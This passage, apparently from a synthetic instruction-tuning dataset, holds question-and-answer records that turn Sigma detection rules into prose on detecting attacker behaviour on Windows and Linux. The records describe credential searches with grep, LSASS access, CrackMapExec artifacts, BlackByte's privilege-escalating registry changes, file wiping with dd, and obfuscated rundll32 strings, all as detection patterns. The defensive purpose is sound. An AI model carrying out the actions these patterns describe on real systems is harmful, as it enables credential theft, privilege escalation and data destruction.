      "answer": "In order to detect changes to the registry keys related to \"Trusted Location\" of Microsoft Office, where attackers might add additional trusted locations to avoid macro security restrictions, you should: Focus on monitoring Windows registry activities, specifically looking for events where registry keys under the \"Security\\Trusted Locations\\Location\" path are modified. These modifications are identified by the EventType \"Setvalue\", which indicates a value within a registry key has been changed. Pay particular attention to registry keys that end with '\\Path', as these are directly related to the locations that Microsoft Office considers trusted. It's crucial to note that legitimate office installations or setups may also modify these keys, adding trusted locations and potentially triggering a detection. Therefore, these changes are categorized with a medium level of concern due to possible false positives during such installations or configurations. Continuously monitoring these registry changes can help in identifying unauthorized attempts to bypass macro security restrictions by tampering with trusted locations."
    }
  },
  {
    "instruction": "Please help me detect the following: an executable in the Windows folder accessing github.com",
    "context": "",
    "output": "Sure!\nIn order to detect an executable in the Windows folder accessing github.com, you should: Monitor network connections sourced from the Windows operating environment, specifically focusing on instances where network traffic is initiated by executables located within the C:\\Windows\\ directory. Special attention should be paid to network connections where the destination hostname ends with either '.github.com' or '.githubusercontent.com', signifying an attempt to access GitHub related domains. It is essential to acknowledge that while this activity can indicate a security concern, there are instances where it might not pose a risk, such as unspecified circumstances or network activities related to '@subTee'. This detection strategy has a high importance due to its potential implication in malicious activities associated with the use of GitHub for distributing or controlling malware, thus closely aligning with tactics and techniques that involve execution, command and control mechanisms.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an executable in the Windows folder accessing github.com",
      "answer": "In order to detect an executable in the Windows folder accessing github.com, you should: Monitor network connections sourced from the Windows operating environment, specifically focusing on instances where network traffic is initiated by executables located within the C:\\Windows\\ directory. Special attention should be paid to network connections where the destination hostname ends with either '.github.com' or '.githubusercontent.com', signifying an attempt to access GitHub related domains. It is essential to acknowledge that while this activity can indicate a security concern, there are instances where it might not pose a risk, such as unspecified circumstances or network activities related to '@subTee'. This detection strategy has a high importance due to its potential implication in malicious activities associated with the use of GitHub for distributing or controlling malware, thus closely aligning with tactics and techniques that involve execution, command and control mechanisms."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Find information about network devices that is not stored in config files",
    "context": "",
    "output": "In order to find information about network devices that is not stored in config files, you should examine logs for the Cisco Authentication, Authorization, and Accounting (AAA) services for specific keyword activity. These keywords signify commands that are often used for legitimate troubleshooting by administrators but could also be leveraged by attackers seeking to gather information about a network's infrastructure. Look for the execution of commands such as 'dir', 'show processes', 'show arp', 'show cdp', 'show version', 'show ip route', 'show ip interface', 'show ip sockets', 'show users', 'show ssh', and 'show clock'. These commands can reveal sensitive details about the network devices, configurations, connected peers, IP routing information, and even user information that are not typically stored in config files but are crucial for understanding the structure and security posture of a network. Monitor fields that include source IP, command set, user name, privilege level, and remote address for any activity. It is important to note that these activities are considered low level indicative of an attack due to their common use in routine administration and troubleshooting. Therefore, when these keywords are observed in the logs, it's necessary to contextually evaluate them considering their source, user, and frequency to accurately distinguish between normal administrative behavior and potential security threats.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Find information about network devices that is not stored in config files",
      "answer": "In order to find information about network devices that is not stored in config files, you should examine logs for the Cisco Authentication, Authorization, and Accounting (AAA) services for specific keyword activity. These keywords signify commands that are often used for legitimate troubleshooting by administrators but could also be leveraged by attackers seeking to gather information about a network's infrastructure. Look for the execution of commands such as 'dir', 'show processes', 'show arp', 'show cdp', 'show version', 'show ip route', 'show ip interface', 'show ip sockets', 'show users', 'show ssh', and 'show clock'. These commands can reveal sensitive details about the network devices, configurations, connected peers, IP routing information, and even user information that are not typically stored in config files but are crucial for understanding the structure and security posture of a network. Monitor fields that include source IP, command set, user name, privilege level, and remote address for any activity. It is important to note that these activities are considered low level indicative of an attack due to their common use in routine administration and troubleshooting. Therefore, when these keywords are observed in the logs, it's necessary to contextually evaluate them considering their source, user, and frequency to accurately distinguish between normal administrative behavior and potential security threats."
    }
  },
  {
    "instruction": "Can you explain how to detect: Local accounts, System Owner/User discovery using operating systems utilities",
    "context": "",
    "output": "Certainly!\n\nIn order to detect activities associated with local accounts, system owner/user discovery using operating systems utilities, you should monitor for the execution of specific Windows utilities and command patterns indicative of enumeration or information gathering efforts. This includes the launching of utilities like 'whoami.exe', 'quser.exe', 'qwinsta.exe', 'wmic.exe' specifically with command lines aimed at retrieving user account information, 'cmdkey.exe' with commands for listing stored user credentials, and 'cmd.exe' with commands that attempt to list directories under the \\Users\\ path but exclude commands aimed at removing directories to avoid false positives. Additionally, execution of 'net.exe' or 'net1.exe' with commands including 'user' but excluding switches that indicate legitimate account management purposes such as '/add', '/domain', '/delete' etc., should also be watched. This approach focuses on identifying actions that suggest an attempt to discover local user accounts or system owners, which are essential steps in many attack scenarios where attackers aim to escalate privileges or move laterally within a network. It is important to keep in mind that there may be legitimate reasons for these utilities to be run by administrators or users, which can lead to potential false positives, thus the alert level is considered low until further investigation confirms malicious intent.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Local accounts, System Owner/User discovery using operating systems utilities",
      "answer": "In order to detect activities associated with local accounts, system owner/user discovery using operating systems utilities, you should monitor for the execution of specific Windows utilities and command patterns indicative of enumeration or information gathering efforts. This includes the launching of utilities like 'whoami.exe', 'quser.exe', 'qwinsta.exe', 'wmic.exe' specifically with command lines aimed at retrieving user account information, 'cmdkey.exe' with commands for listing stored user credentials, and 'cmd.exe' with commands that attempt to list directories under the \\Users\\ path but exclude commands aimed at removing directories to avoid false positives. Additionally, execution of 'net.exe' or 'net1.exe' with commands including 'user' but excluding switches that indicate legitimate account management purposes such as '/add', '/domain', '/delete' etc., should also be watched. This approach focuses on identifying actions that suggest an attempt to discover local user accounts or system owners, which are essential steps in many attack scenarios where attackers aim to escalate privileges or move laterally within a network. It is important to keep in mind that there may be legitimate reasons for these utilities to be run by administrators or users, which can lead to potential false positives, thus the alert level is considered low until further investigation confirms malicious intent."
    }
  },
  {
    "instruction": "Explain how should I detect the following: use of a Microsoft signed script to execute commands",
    "context": "",
    "output": "In order to detect the use of a Microsoft signed script to execute commands, you should: Monitor process creation logs on Windows systems for instances where command lines contain both the '\\CL_Mutexverifiers.ps1' script and the 'runAfterCancelProcess' phrase. This involves paying attention to any process that is executed with these specific command line parameters, as it might indicate an attempt to misuse a Microsoft signed script for executing potentially unauthorized or malicious commands. The detection carries a medium severity level, suggesting a cautious approach to potential false positives, which may occur but are currently unspecified.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "use of a Microsoft signed script to execute commands",
      "answer": "In order to detect the use of a Microsoft signed script to execute commands, you should: Monitor process creation logs on Windows systems for instances where command lines contain both the '\\CL_Mutexverifiers.ps1' script and the 'runAfterCancelProcess' phrase. This involves paying attention to any process that is executed with these specific command line parameters, as it might indicate an attempt to misuse a Microsoft signed script for executing potentially unauthorized or malicious commands. The detection carries a medium severity level, suggesting a cautious approach to potential false positives, which may occur but are currently unspecified."
    }
  },
  {
    "instruction": "Explain how should I detect the following: BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption",
    "context": "",
    "output": "In order to detect attempts by BlackByte to escalate privileges and begin setting the stage for lateral movement and encryption, you should monitor for specific registry modifications on Windows systems. Specifically, look for the setting of registry values that indicate an attempt to change system policies or filesystem configurations that could facilitate these actions. These registry modifications include changing the `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled` keys within the Windows Registry.\n\nWhen detecting these modifications, focus on the `SetValue` event type, which shows that a value is being changed in the registry. The specific keys to watch for are within the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System` for `LocalAccountTokenFilterPolicy` and `EnableLinkedConnections`, and `HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem` for `LongPathsEnabled`. The modification to these keys involves setting their value to `DWORD (0x00000001)`, which typically enables certain behaviors or features that could be exploited for privilege escalation or to facilitate lateral movement.\n\nThe level of concern for these modifications is high, although it is acknowledged that the reasons for these registry modifications could be legitimate and thus could lead to potential false positives. However, due to the critical nature of these changes in the context of a potential BlackByte attack scenario, it's important to closely monitor and investigate any changes to these specific registry values.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption",
      "answer": "In order to detect attempts by BlackByte to escalate privileges and begin setting the stage for lateral movement and encryption, you should monitor for specific registry modifications on Windows systems. Specifically, look for the setting of registry values that indicate an attempt to change system policies or filesystem configurations that could facilitate these actions. These registry modifications include changing the `LocalAccountTokenFilterPolicy`, `EnableLinkedConnections`, and `LongPathsEnabled` keys within the Windows Registry.\n\nWhen detecting these modifications, focus on the `SetValue` event type, which shows that a value is being changed in the registry. The specific keys to watch for are within the `HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System` for `LocalAccountTokenFilterPolicy` and `EnableLinkedConnections`, and `HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem` for `LongPathsEnabled`. The modification to these keys involves setting their value to `DWORD (0x00000001)`, which typically enables certain behaviors or features that could be exploited for privilege escalation or to facilitate lateral movement.\n\nThe level of concern for these modifications is high, although it is acknowledged that the reasons for these registry modifications could be legitimate and thus could lead to potential false positives. However, due to the critical nature of these changes in the context of a potential BlackByte attack scenario, it's important to closely monitor and investigate any changes to these specific registry values."
    }
  },
  {
    "instruction": "Can you explain how to detect: Hurricane Panda Activity",
    "context": "",
    "output": "Certainly!\n\nIn order to detect Hurricane Panda Activity, you should monitor the creation of new processes on Windows systems for executing commands that involve adding a user to the local administrators group or running a file named 'Win64.exe'. Specifically, look for command lines that include all of the following keywords: 'localgroup', 'admin', and '/add'; or command lines that contain the string '\\Win64.exe'. This approach is aimed at identifying potential unauthorized attempts to gain elevated privileges or execute malicious software, both of which are tactics commonly employed by the Hurricane Panda threat group. Be aware that detections based on these criteria could lead to some false positives, although the potential impact of this threat warrants a high level of alertness.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Hurricane Panda Activity",
      "answer": "In order to detect Hurricane Panda Activity, you should monitor the creation of new processes on Windows systems for executing commands that involve adding a user to the local administrators group or running a file named 'Win64.exe'. Specifically, look for command lines that include all of the following keywords: 'localgroup', 'admin', and '/add'; or command lines that contain the string '\\Win64.exe'. This approach is aimed at identifying potential unauthorized attempts to gain elevated privileges or execute malicious software, both of which are tactics commonly employed by the Hurricane Panda threat group. Be aware that detections based on these criteria could lead to some false positives, although the potential impact of this threat warrants a high level of alertness."
    }
  },
  {
    "instruction": "How to detect: indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
    "context": "",
    "output": "In order to detect indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability, you should monitor for the creation of processes on Windows systems where the process name ends with '\\pcwrun.exe' and its command line arguments contain '../'. This activity suggests exploitation attempts utilizing the specified vulnerability in \"pcwrun.exe\", which is a part of the Windows operating environment. Careful observation of these process creation events can provide early warning of an attack leveraging this vulnerability. False positives are considered unlikely, indicating that such detection should be highly reliable. The severity level of this detection is considered high, underscoring the importance of promptly identifying and responding to these events.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability",
      "answer": "In order to detect indirect command execution via Program Compatibility Assistant \"pcwrun.exe\" leveraging the follina (CVE-2022-30190) vulnerability, you should monitor for the creation of processes on Windows systems where the process name ends with '\\pcwrun.exe' and its command line arguments contain '../'. This activity suggests exploitation attempts utilizing the specified vulnerability in \"pcwrun.exe\", which is a part of the Windows operating environment. Careful observation of these process creation events can provide early warning of an attack leveraging this vulnerability. False positives are considered unlikely, indicating that such detection should be highly reliable. The severity level of this detection is considered high, underscoring the importance of promptly identifying and responding to these events."
    }
  },
  {
    "instruction": "Explain how should I detect the following: detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one",
    "context": "",
    "output": "In order to detect execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one, you should: Monitor SMB file service logs for specific patterns that indicate the use of remote execution tools such as psexec or paexec, which are often utilized by attackers to execute commands on remote systems. Focus on logs where the file path includes both backslashes \"\\\\\" and the special IPC$ share '\\IPC$', indicating an attempt to access administrative shares typical in lateral movement activities. Moreover, look for files with names ending in '-stdin', '-stdout', or '-stderr', which are indicative of input/output redirection commonly used by these tools. It's important to exclude any activity where the file name starts with 'PSEXESVC', as this is the default service name used by psexec for legitimate purposes. The detection of such activities is considered high priority due to the potential misuse for malicious purposes, particularly in lateral movement during an attack. Pay attention to any false positives that may arise, although they are currently unknown, and continuously refine detection methods to improve accuracy.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "detects execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one",
      "answer": "In order to detect execution of psexec or paexec with renamed service name, this rule helps to filter out the noise if psexec is used for legit purposes or if attacker uses a different psexec client other than sysinternal one, you should: Monitor SMB file service logs for specific patterns that indicate the use of remote execution tools such as psexec or paexec, which are often utilized by attackers to execute commands on remote systems. Focus on logs where the file path includes both backslashes \"\\\\\" and the special IPC$ share '\\IPC$', indicating an attempt to access administrative shares typical in lateral movement activities. Moreover, look for files with names ending in '-stdin', '-stdout', or '-stderr', which are indicative of input/output redirection commonly used by these tools. It's important to exclude any activity where the file name starts with 'PSEXESVC', as this is the default service name used by psexec for legitimate purposes. The detection of such activities is considered high priority due to the potential misuse for malicious purposes, particularly in lateral movement during an attack. Pay attention to any false positives that may arise, although they are currently unknown, and continuously refine detection methods to improve accuracy."
    }
  },
  {
    "instruction": "How can I detect: execution of Scheduled Tasks where the Program being run is located in a suspicious location or it's an unusale program to be run from a Scheduled Task",
    "context": "",
    "output": "In order to detect the execution of Scheduled Tasks where the Program being run is located in a suspicious location or it's an unusual program to be run from a Scheduled Task, you should monitor the Windows Task Scheduler for task creation events specifically with the Event ID 129, which signifies a created task process. This detection focuses on tasks that are configured to execute programs located in paths that are commonly used by attackers to stage or execute malicious software, including 'C:\\Windows\\Temp\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\Downloads\\', '\\Users\\Public\\', and 'C:\\Temp\\'. These locations are typically writable by non-administrative users and are therefore popular choices for temporary storage of malicious files. Monitoring for tasks executing from these directories can help identify potential malicious activity, such as malware launching or persistence mechanisms being established. It's important to have the \"Microsoft-Windows-TaskScheduler/Operational\" logging enabled to capture the necessary information for this detection to work. Be aware that monitoring these events may lead to unknown false positives, which can be reduced by specifically excluding known legitimate tasks from the detection logic if necessary.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of Scheduled Tasks where the Program being run is located in a suspicious location or it's an unusale program to be run from a Scheduled Task",
      "answer": "In order to detect the execution of Scheduled Tasks where the Program being run is located in a suspicious location or it's an unusual program to be run from a Scheduled Task, you should monitor the Windows Task Scheduler for task creation events specifically with the Event ID 129, which signifies a created task process. This detection focuses on tasks that are configured to execute programs located in paths that are commonly used by attackers to stage or execute malicious software, including 'C:\\Windows\\Temp\\', '\\AppData\\Local\\Temp\\', '\\Desktop\\', '\\Downloads\\', '\\Users\\Public\\', and 'C:\\Temp\\'. These locations are typically writable by non-administrative users and are therefore popular choices for temporary storage of malicious files. Monitoring for tasks executing from these directories can help identify potential malicious activity, such as malware launching or persistence mechanisms being established. It's important to have the \"Microsoft-Windows-TaskScheduler/Operational\" logging enabled to capture the necessary information for this detection to work. Be aware that monitoring these events may lead to unknown false positives, which can be reduced by specifically excluding known legitimate tasks from the detection logic if necessary."
    }
  },
  {
    "instruction": "Please help me detect the following: import of '.reg' files from suspicious paths using the 'reg.exe' utility",
    "context": "",
    "output": "Sure!\nIn order to detect the import of '.reg' files from suspicious paths using the 'reg.exe' utility, you should monitor the creation of processes on Windows systems, specifically looking for instances where the 'reg.exe' utility is executed. Pay close attention to the command line used during the process creation, particularly watching for the use of ' import ' as this indicates the importation of registry keys. Equally important is to scrutinize the paths from which these '.reg' files are being imported. Common pathways for suspicious activity include user directories like 'C:\\Users\\', temporary folders such as '%temp%', '%tmp%', system application data folders like '%appdata%' and specific paths including '\\AppData\\Local\\Temp\\', 'C:\\Windows\\Temp\\', and 'C:\\ProgramData\\'. All these elements combined indicate potentially malicious action. However, bear in mind that there are legitimate uses for importing keys, and these should be considered as possible false positives. The importance of this detection process is rated as medium due to its potential for flagging normal administrative activities as suspicious.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "import of '.reg' files from suspicious paths using the 'reg.exe' utility",
      "answer": "In order to detect the import of '.reg' files from suspicious paths using the 'reg.exe' utility, you should monitor the creation of processes on Windows systems, specifically looking for instances where the 'reg.exe' utility is executed. Pay close attention to the command line used during the process creation, particularly watching for the use of ' import ' as this indicates the importation of registry keys. Equally important is to scrutinize the paths from which these '.reg' files are being imported. Common pathways for suspicious activity include user directories like 'C:\\Users\\', temporary folders such as '%temp%', '%tmp%', system application data folders like '%appdata%' and specific paths including '\\AppData\\Local\\Temp\\', 'C:\\Windows\\Temp\\', and 'C:\\ProgramData\\'. All these elements combined indicate potentially malicious action. However, bear in mind that there are legitimate uses for importing keys, and these should be considered as possible false positives. The importance of this detection process is rated as medium due to its potential for flagging normal administrative activities as suspicious."
    }
  },
  {
    "instruction": "Can you explain how to detect: service installation of different remote access tools software. These software are often abused by threat actors to perform",
    "context": "",
    "output": "Certainly!\n\nIn order to detect service installation of different remote access tools software, which are often abused by threat actors to perform malicious activities, you should focus on monitoring Windows System logs for service-related events. Specifically, look for logs indicating that the Service Control Manager has reported Event IDs 7045 or 7036. These events indicate service installation and state changes, respectively. \n\nThe attention should be on services named or containing names of several known remote access tools such as Ammyy Admin, Atera, BA Support Express Service Updater, BA Support Express Standalone Service, chromoting (Chrome Remote Desktop), GoToAssist, GoToMyPC, jumpcloud, LMIGuardianSvc (part of LogMeIn), LogMeIn, monblanking, Parsec, RManService, RPC Performance Service, RPC Service (both associated with RemotePC), Splashtop Remote Service, SSU Service, TeamViewer, TightVNC, vncserver, and Zoho. \n\nThese services have legitimate uses, such as remote support and administration, but are known to be leveraged by attackers for unauthorized remote access. False positives are possible, given the legitimate use of these tools in various IT environments, so each detection should be investigated to ascertain if it is part of a standard operation or a potential security incident. This monitoring strategy is aligned with various MITRE ATT&CK tactics and techniques associated with the misuse of remote services to execute commands or control systems remotely.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "service installation of different remote access tools software. These software are often abused by threat actors to perform",
      "answer": "In order to detect service installation of different remote access tools software, which are often abused by threat actors to perform malicious activities, you should focus on monitoring Windows System logs for service-related events. Specifically, look for logs indicating that the Service Control Manager has reported Event IDs 7045 or 7036. These events indicate service installation and state changes, respectively. \n\nThe attention should be on services named or containing names of several known remote access tools such as Ammyy Admin, Atera, BA Support Express Service Updater, BA Support Express Standalone Service, chromoting (Chrome Remote Desktop), GoToAssist, GoToMyPC, jumpcloud, LMIGuardianSvc (part of LogMeIn), LogMeIn, monblanking, Parsec, RManService, RPC Performance Service, RPC Service (both associated with RemotePC), Splashtop Remote Service, SSU Service, TeamViewer, TightVNC, vncserver, and Zoho. \n\nThese services have legitimate uses, such as remote support and administration, but are known to be leveraged by attackers for unauthorized remote access. False positives are possible, given the legitimate use of these tools in various IT environments, so each detection should be investigated to ascertain if it is part of a standard operation or a potential security incident. This monitoring strategy is aligned with various MITRE ATT&CK tactics and techniques associated with the misuse of remote services to execute commands or control systems remotely."
    }
  },
  {
    "instruction": "Explain how should I detect the following: the execution of the extended storage procedure backdoor named Maggie in the context of Microsoft SQL server",
    "context": "",
    "output": "In order to detect the execution of the extended storage procedure backdoor named Maggie in the context of Microsoft SQL server, you should: Monitor application logs from Windows systems, specifically focusing on logs from the Microsoft SQL Server (identified by the product code MSSQLSERVER). Look for event ID 8128, which indicates the execution of stored procedures. Within these logs, pay special attention to any instances where the message content includes the string 'maggie'. This is a strong indicator of the Maggie backdoor being executed. It's important to note that while this activity is highly indicative of malicious behavior, there are circumstances under which legitimate stored procedures could be named 'maggie', leading to potential false positives. The severity of this detection is considered high due to the implications of a backdoor being present on a Microsoft SQL Server.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "the execution of the extended storage procedure backdoor named Maggie in the context of Microsoft SQL server",
      "answer": "In order to detect the execution of the extended storage procedure backdoor named Maggie in the context of Microsoft SQL server, you should: Monitor application logs from Windows systems, specifically focusing on logs from the Microsoft SQL Server (identified by the product code MSSQLSERVER). Look for event ID 8128, which indicates the execution of stored procedures. Within these logs, pay special attention to any instances where the message content includes the string 'maggie'. This is a strong indicator of the Maggie backdoor being executed. It's important to note that while this activity is highly indicative of malicious behavior, there are circumstances under which legitimate stored procedures could be named 'maggie', leading to potential false positives. The severity of this detection is considered high due to the implications of a backdoor being present on a Microsoft SQL Server."
    }
  },
  {
    "instruction": "Please help me detect the following: Detecting attempts to extract passwords with grep",
    "context": "",
    "output": "Sure!\nIn order to detect attempts to extract passwords with grep, you should monitor for specific events captured by the audit daemon (`auditd`) on Linux systems. Focus on the `EXECVE` event type, which indicates the execution of commands. Look for instances where the `grep` command is used alongside the keyword `password`. This combination suggests an attempt to search through files or command outputs for password information, which is a common tactic employed by attackers trying to find sensitive information. It is important to note that any detection related to this activity is considered to have a high level of importance due to the potential for exposing sensitive information. However, be aware that there may be legitimate uses of `grep` with the term `password` that are not malicious, but these cases are unknown and should be investigated thoroughly. The activity to watch closely involves the use of Linux's audit system for monitoring command executions that could be attempting to illicitly extract password information, aligning with tactics and techniques that involve the collection of credentials without proper authorization.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Detecting attempts to extract passwords with grep",
      "answer": "In order to detect attempts to extract passwords with grep, you should monitor for specific events captured by the audit daemon (`auditd`) on Linux systems. Focus on the `EXECVE` event type, which indicates the execution of commands. Look for instances where the `grep` command is used alongside the keyword `password`. This combination suggests an attempt to search through files or command outputs for password information, which is a common tactic employed by attackers trying to find sensitive information. It is important to note that any detection related to this activity is considered to have a high level of importance due to the potential for exposing sensitive information. However, be aware that there may be legitimate uses of `grep` with the term `password` that are not malicious, but these cases are unknown and should be investigated thoroughly. The activity to watch closely involves the use of Linux's audit system for monitoring command executions that could be attempting to illicitly extract password information, aligning with tactics and techniques that involve the collection of credentials without proper authorization."
    }
  },
  {
    "instruction": "How can I detect: potential overwriting and deletion of a file using DD.",
    "context": "",
    "output": "In order to detect potential overwriting and deletion of a file using DD, you should: Monitor the creation of processes in Linux systems specifically for instances where the 'dd' command, located at '/bin/dd' or '/usr/bin/dd', is utilized. The detection focuses on commands that include 'of=' (indicating the output file destination), and ones where the input file is either '/dev/zero' or '/dev/null'. This setup aims to catch scenarios where the 'dd' command may be used inappropriately for overwriting or deleting files. Beware that there could be legitimate instances where a user employs this method for file management, hence these detections are considered of low severity.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential overwriting and deletion of a file using DD.",
      "answer": "In order to detect potential overwriting and deletion of a file using DD, you should: Monitor the creation of processes in Linux systems specifically for instances where the 'dd' command, located at '/bin/dd' or '/usr/bin/dd', is utilized. The detection focuses on commands that include 'of=' (indicating the output file destination), and ones where the input file is either '/dev/zero' or '/dev/null'. This setup aims to catch scenarios where the 'dd' command may be used inappropriately for overwriting or deleting files. Beware that there could be legitimate instances where a user employs this method for file management, hence these detections are considered of low severity."
    }
  },
  {
    "instruction": "How to detect: default filenames output from the execution of CrackMapExec and Impacket-secretsdump against an endpoint.",
    "context": "",
    "output": "In order to detect default filenames output from the execution of CrackMapExec and Impacket-secretsdump against an endpoint, you should focus on monitoring Windows file events. Look specifically for events where the image path ends with '\\svchost.exe'. This is indicative of a potentially malicious service execution. Furthermore, if your logging setup includes command line data for file events, add an additional layer of accuracy by checking for instances where the command line contains 'RemoteRegistry'. Also, pay attention to file creation events, especially files created in the Windows\\System32 directory with a temporary (.tmp) file extension following a specific pattern: an eight-character alphanumeric filename. This detection strategy is considered to have a high level of importance due to the nature of the activities it aims to uncover, which are related to tactics and techniques commonly used in credential access and lateral movement. Be aware that there might be instances where legitimate activities trigger this rule, although they are currently unknown.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "default filenames output from the execution of CrackMapExec and Impacket-secretsdump against an endpoint.",
      "answer": "In order to detect default filenames output from the execution of CrackMapExec and Impacket-secretsdump against an endpoint, you should focus on monitoring Windows file events. Look specifically for events where the image path ends with '\\svchost.exe'. This is indicative of a potentially malicious service execution. Furthermore, if your logging setup includes command line data for file events, add an additional layer of accuracy by checking for instances where the command line contains 'RemoteRegistry'. Also, pay attention to file creation events, especially files created in the Windows\\System32 directory with a temporary (.tmp) file extension following a specific pattern: an eight-character alphanumeric filename. This detection strategy is considered to have a high level of importance due to the nature of the activities it aims to uncover, which are related to tactics and techniques commonly used in credential access and lateral movement. Be aware that there might be instances where legitimate activities trigger this rule, although they are currently unknown."
    }
  },
  {
    "instruction": "Please help me detect the following: Access to LSASS Process",
    "context": "",
    "output": "Sure!\nIn order to Detect Access to LSASS Process, you should monitor the Windows Defender logs specifically for events related to the Windows local security authority subsystem (LSASS.exe), which plays a critical role in handling system security policies and logging on users on Windows systems. Focus on detecting events with the ID 1121 that indicate interaction with the LSASS process, particularly when the path ends with '\\lsass.exe'. However, it is important to exclude certain processes that are known to legitimately interact with LSASS under normal circumstances. These include processes initiated from the 'C:\\Windows\\Temp\\asgard2-agent\\' directory, specifically 'thor64.exe' and 'thor.exe', as well as exact matches for several critical system processes like 'C:\\Windows\\System32\\atiesrxx.exe', 'C:\\Windows\\System32\\CompatTelRunner.exe', and others listed, largely involving important system and management functionalities. Additionally, pay attention to processes starting with common system directories such as 'C:\\Windows\\System32\\DriverStore\\', 'C:\\WINDOWS\\Installer\\', and both 'C:\\Program Files\\' directories, which are also typically legitimate. Be mindful of false positives, which may include activities related to Google Chrome's 'GoogleUpdate.exe' and some uses of 'Taskmgr.exe'. This high alert level indicates the criticality of unauthorized access to LSASS, as it could suggest an attempt to steal credentials or perform other malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Access to LSASS Process",
      "answer": "In order to Detect Access to LSASS Process, you should monitor the Windows Defender logs specifically for events related to the Windows local security authority subsystem (LSASS.exe), which plays a critical role in handling system security policies and logging on users on Windows systems. Focus on detecting events with the ID 1121 that indicate interaction with the LSASS process, particularly when the path ends with '\\lsass.exe'. However, it is important to exclude certain processes that are known to legitimately interact with LSASS under normal circumstances. These include processes initiated from the 'C:\\Windows\\Temp\\asgard2-agent\\' directory, specifically 'thor64.exe' and 'thor.exe', as well as exact matches for several critical system processes like 'C:\\Windows\\System32\\atiesrxx.exe', 'C:\\Windows\\System32\\CompatTelRunner.exe', and others listed, largely involving important system and management functionalities. Additionally, pay attention to processes starting with common system directories such as 'C:\\Windows\\System32\\DriverStore\\', 'C:\\WINDOWS\\Installer\\', and both 'C:\\Program Files\\' directories, which are also typically legitimate. Be mindful of false positives, which may include activities related to Google Chrome's 'GoogleUpdate.exe' and some uses of 'Taskmgr.exe'. This high alert level indicates the criticality of unauthorized access to LSASS, as it could suggest an attempt to steal credentials or perform other malicious activities."
    }
  },
  {
    "instruction": "How can I detect: Obfuscated Powershell via use Rundll32 in Scripts",
    "context": "",
    "output": "In order to detect obfuscated PowerShell via use of Rundll32 in scripts, you should monitor PowerShell script activities within a Windows environment, specifically looking for script execution that involves certain characteristics indicative of suspicious behavior. This requires that Script Block Logging is enabled on the system to accurately capture and analyze PowerShell script blocks.\n\nSpecifically, look for script block texts that contain all of the following elements: '&&', 'rundll32', 'shell32.dll', and 'shellexec_rundll'. Additionally, keep an eye out for script block texts that include any of these elements: 'value', 'invoke', 'comspec', or 'iex'. The presence of these strings within a script block is indicative of an attempt to execute commands or scripts in a manner that is commonly associated with obfuscation techniques, often aiming to bypass security measures by leveraging the 'rundll32' command alongside PowerShell.\n\nThese detection criteria are deemed to be of high importance due to the potential for these actions to be part of malicious activities, such as executing malware or facilitating unauthorized access to systems. However, it is important to be aware of potential unknown false positives, as there may be legitimate use cases that exhibit similar characteristics to these detection patterns.\n\nThe activity aligns with tactics and techniques that typically involve the Execution phase within the MITRE ATT&CK framework, especially where PowerShell is utilized for command and script execution in combination with the use of 'rundll32' to execute binary code. Monitoring for these specific script block texts serves as a crucial step in identifying and mitigating potential threats that leverage obfuscated PowerShell scripts for malicious purposes.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Obfuscated Powershell via use Rundll32 in Scripts",
